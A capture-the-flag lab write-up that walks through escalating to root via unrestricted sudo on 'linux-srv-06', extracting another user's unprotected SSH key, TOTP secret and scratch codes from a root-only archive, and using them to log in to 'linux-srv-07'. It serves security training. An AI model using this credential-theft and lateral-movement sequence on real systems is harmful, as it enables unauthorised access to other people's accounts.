# Accessing `linux-srv-06`

## Login as `dave`

We are still logged in on `linux-srv-06` as `dave`:

```shell-session
dave@linux-srv-06:~$ hostname
linux-srv-06.nullbyte.internal

dave@linux-srv-06:~$ id
uid=1000(dave) gid=1000(dave) groups=1000(dave),27(sudo)
```

## Flag

Get the flag:

```shell-session
dave@linux-srv-06:~$ cat /flag.txt 
ssh-labs{dangrous-unprotected-unix-socket}
```

## Information Gathering

Get the users:

```shell-session
dave@linux-srv-06:~$ getent passwd
root:x:0:0:root:/root:/bin/bash
[...]
dave:x:1000:1000::/home/dave:/bin/bash
```

- No other interesting users.

Get the processes:

```shell-session
dave@linux-srv-06:~$ ps -ef 
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 13:30 ?        00:00:00 bash /srv/entrypoint
root           8       1  0 13:30 ?        00:00:00 sshd: /usr/sbin/sshd -E /var/log/sshd [listener] 0 of 10-100 startup
root           9       1  0 13:30 ?        00:00:01 tail -f /dev/null
root          10       8  0 13:30 ?        00:00:00 sshd-session: dave [priv]
dave          16      10  0 13:30 ?        00:00:00 sshd-session: dave@pts/0,pts/1
dave          17      16  0 13:30 pts/0    00:00:00 -bash
dave          41      16  0 17:52 pts/1    00:00:00 -bash
dave          54      41  0 17:57 pts/1    00:00:00 ps -ef
```

- Not much to see.

Check the file system for some interesting files:

```
dave@linux-srv-06:~$ ls -l /opt/
total 4
drwxr-xr-x 2 root root 4096 Feb  5 10:18 temporary-remote-access

dave@linux-srv-06:~$ ls -l /opt/temporary-remote-access/
total 12
-rw------- 1 root root 10240 Feb  5 10:04 ssh-access-frank.tar
```

- There is a non-default file in `/opt`.
- The file can only be read by `root`

Check `sudo` permissions:

```shell-session
dave@linux-srv-06:~$ sudo -l
Matching Defaults entries for dave on linux-srv-06:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dave may run the following commands on linux-srv-06:
    (ALL : ALL) NOPASSWD: ALL
```

- `dave` can execute all commands as `root`.

Open a shell as root:

```shell-session
dave@linux-srv-06:~$ sudo -i

root@linux-srv-06:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Extract tar:

```
root@linux-srv-06:~# cd /opt/temporary-remote-access/

root@linux-srv-06:/opt/temporary-remote-access# tar -xvf ssh-access-frank.tar 
id_ed25519
id_ed25519.pub
ssh-access-frank.txt
```

- There are SSH keys and a file regarding SSH access.


Check if the private key is password protected:

```shell-session
root@linux-srv-06:/opt/temporary-remote-access# ssh-keygen -y -f id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTr+WAD1gtBHIzOh6DK0Lvr8gUrjvK6EPil/GuVJ3YO frank@aix
```

- The public key could be derived from the private key without entering a password.
- Therefore, the private key is not password protected.

Open the textfile:

```
root@linux-srv-06:/opt/temporary-remote-access# cat ssh-access-frank.txt 
Hi Frank

You can temporarily login on `linux-srv-07` server as `frank` using the
provided SSH key:

  * id_ed25519

For security reasons, this system also requires MFA.

Please enroll your personal MFA OTP code in your favourite OTP app using the
following QR code:

  █████████████████████████████████████████
  █████████████████████████████████████████
  ████ ▄▄▄▄▄ █   █▄▄▀ █▄ ▄▀▀▄▄██ ▄▄▄▄▄ ████
  ████ █   █ █ ▀▄ ██▄▀ █ ██▄█▄▄█ █   █ ████
  ████ █▄▄▄█ █▀██▀▀ █ ▀ ▀▀ ▀▄▄ █ █▄▄▄█ ████
  ████▄▄▄▄▄▄▄█▄▀▄█ █▄▀▄█▄█ ▀ ▀▄█▄▄▄▄▄▄▄████
  ████▄ ▀█  ▄██▀▀▄▀▄  █  ▄▀▄  █▀█ █  ▄▄████
  ████ █▀▄▀▀▄▀▀█▀ ▄ ▄█████ ▀▀  ▄▀████ █████
  █████▄▀▄ █▄▀▄▀▄█▄ ▀ █▀▀█▀ █▀██▄█▄ ▀ ▄████
  ████ ▄█ ▀ ▄ █▀ █▀█▀▀  ▄█▀ █▄▀█▀  ▄█▄█████
  ████▀▄▀ ▀ ▄  █▀▄▀▄▄▀ ▄█▄█▄▀ ▄▀▄ ▄██▄▄████
  ████▀▀▄  █▄ ███ ▄ ▄▀ ▄ █    ▄▀█▄  █▄█████
  ████ ▀▀ ▄█▄▀▄ ▀█▄ ▀ █ ▄▄▄▄▀ ▄▀▄ ▄▄██▄████
  ██████▄▄ █▄▄▀█▀█▀█▀▀▄▀█▀█▀█ ▀▄ ██ ▄ ▀████
  ████▄▄█▄▄█▄▄▀ █▄▀▄▄▄ ▀ ▄█ ▀▄ ▄▄▄ ▀█▀█████
  ████ ▄▄▄▄▄ █▀▀▄ ▄ ▄ ██▄▀▄▀██ █▄█ ▀▄▄▀████
  ████ █   █ █▄███▄ ▀█  ▀▄▄▄ █ ▄ ▄ ▀█ █████
  ████ █▄▄▄█ █▀▄ █▀█▀▄█▀▀█ ▀▄ ██ ▀ █▄██████
  ████▄▄▄▄▄▄▄█▄█▄▄█▄▄█▄█▄▄▄▄▄▄▄██▄█▄██▄████
  █████████████████████████████████████████
  █████████████████████████████████████████

  otpauth://totp/frank@linux-srv-07?secret=4BBUGHWJT5DVOUFKH5FVAJHUWA

Alternatively, you can generate the OTPs on your system using oathtool:

  $ oathtool --base32 --totp 4BBUGHWJT5DVOUFKH5FVAJHUWA


Your emergency scratch codes are:

  - 44947843
  - 11191146
  - 72303726
  - 43673876
  - 28918687


Best regards,
IT Department
```

- The user `frank` can login on `linux-srv-07` via the provided SSH key.
- MFA is requried for this sensitive system.
- The MFA OTP secret is in the textfile.

Trying to perform a login on `linux-srv-07` as `frank`:

```
root@linux-srv-06:/opt/temporary-remote-access# ssh -v -i id_ed25519 frank@linux-srv-07
[...]
The authenticity of host 'linux-srv-07 (10.5.23.17)' can't be established.
ED25519 key fingerprint is SHA256:wjDA9ABTrJff04x8RZXj+xDaJqibLESDinCQmCXj4sM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
[...]
debug1: Authentications that can continue: publickey
debug1: Next authentication method: publickey
debug1: Will attempt key: id_ed25519 ED25519 SHA256:l2uLfTts6rPP9tXyZhsLwATcOBzgelLjNaNCcK62CWQ explicit
debug1: Offering public key: id_ed25519 ED25519 SHA256:l2uLfTts6rPP9tXyZhsLwATcOBzgelLjNaNCcK62CWQ explicit
debug1: Server accepts key: id_ed25519 ED25519 SHA256:l2uLfTts6rPP9tXyZhsLwATcOBzgelLjNaNCcK62CWQ explicit
Authenticated using "publickey" with partial success.
debug1: Authentications that can continue: keyboard-interactive
debug1: Next authentication method: keyboard-interactive
(frank@linux-srv-07) Verification code: 
```

- The private key is accepted by the server and therefore valid.
- MFA is required. The OTP can be derived from the OTP secret.